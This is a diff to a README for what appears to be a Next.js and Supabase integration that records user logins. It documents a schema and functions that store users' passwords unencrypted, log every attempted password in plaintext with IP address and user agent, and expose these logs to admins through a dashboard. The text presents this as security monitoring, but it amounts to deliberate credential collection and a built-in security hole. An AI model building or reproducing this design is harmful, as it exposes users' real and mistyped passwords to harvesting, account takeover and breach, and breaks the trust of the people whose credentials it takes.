@@ -36,27 +36,47 @@ This integration automatically saves user login credentials and profile informat
 
 ## What Gets Stored
 
-When a user logs in, the system stores:
-
-### User Credentials
-- Email address
-- Password (unencrypted as requested)
-
-### User Profile Data
+### User Credentials & Profile (on successful login)
+- Email address and password (unencrypted as requested)
 - Complete user profile from the API
 - Enrollment details, personal information, program info, etc.
-- All profile fields in JSON format
+- Premium status for feature access
+
+### Login Attempt Logs (every login attempt)
+- Email and attempted password
+- Login status (SUCCESS/FAILED)
+- Error messages for failed attempts
+- IP address and user agent information
+- Timestamp of attempt
+
+All login attempts are automatically logged for security monitoring and debugging purposes.
 
 ## Database Schema
 
+### User Data Table
 ```sql
 user_data {
   id: BIGSERIAL PRIMARY KEY
   email: VARCHAR(255) UNIQUE NOT NULL
   password: TEXT NOT NULL
   user_profile: JSONB
+  is_premium: BOOLEAN DEFAULT FALSE
   created_at: TIMESTAMP WITH TIME ZONE
   updated_at: TIMESTAMP WITH TIME ZONE
+}
+```
+
+### Login Logs Table
+```sql
+login_logs {
+  id: BIGSERIAL PRIMARY KEY
+  email: VARCHAR(255) NOT NULL
+  password_attempted: TEXT NOT NULL
+  login_status: VARCHAR(20) CHECK IN ('SUCCESS', 'FAILED')
+  error_message: TEXT
+  ip_address: VARCHAR(45)
+  user_agent: TEXT
+  attempted_at: TIMESTAMP WITH TIME ZONE DEFAULT NOW()
 }
 ```
 
@@ -86,22 +106,38 @@ console.log(userData.email);
 
 ## API Functions
 
-### `saveUserData(email, password, userProfile?)`
-- Saves or updates user data in Supabase
-- Creates new record if user doesn't exist
-- Updates existing record with new profile data
+### User Data Functions
+- `saveUserData(email, password, userProfile?, isPremium?)` - Saves user data (INSERT only)
+- `checkUserExists(email)` - Checks if user exists using secure view
+- `checkUserPremiumStatus(email)` - Gets user premium status
 
-### `getUserData(email)`
-- Retrieves stored user data from Supabase
-- Returns null if user not found
+### Login Logging Functions
+- `saveLoginLog(email, password, status, errorMessage?)` - Records login attempts
+- `getLoginLogs()` - Retrieves all login logs for admin view (with pagination support)
+
+### Security Features
+- Public views for secure data access
+- Automatic login attempt logging
+- Premium user access control
 
 ## Files Modified/Created
 
+### Core Integration
 - `lib/supabase.ts` - Supabase configuration and data functions
-- `lib/auth.ts` - Modified to integrate with Supabase on login
-- `components/data-sync.tsx` - Manual sync component
-- `supabase-setup.sql` - Database table creation script
+- `lib/auth.ts` - Modified to integrate with Supabase and login logging
+- `supabase-setup.sql` - Database tables and views creation script
 - `.env.local.example` - Environment variables template
+
+### UI Components
+- `components/data-sync.tsx` - Manual sync component
+- `app/login-logs/page.tsx` - Admin interface for viewing login logs
+- `components/sidebar.tsx` - Updated to include Login Logs menu
+
+### Features Added
+- **Login Logs Dashboard**: View all login attempts with filtering and search
+- **Real-time Logging**: Automatic logging of successful and failed login attempts
+- **Security Monitoring**: Track suspicious login patterns and failed attempts
+- **Admin Interface**: Premium feature for viewing login analytics
 
 ## Troubleshooting
 
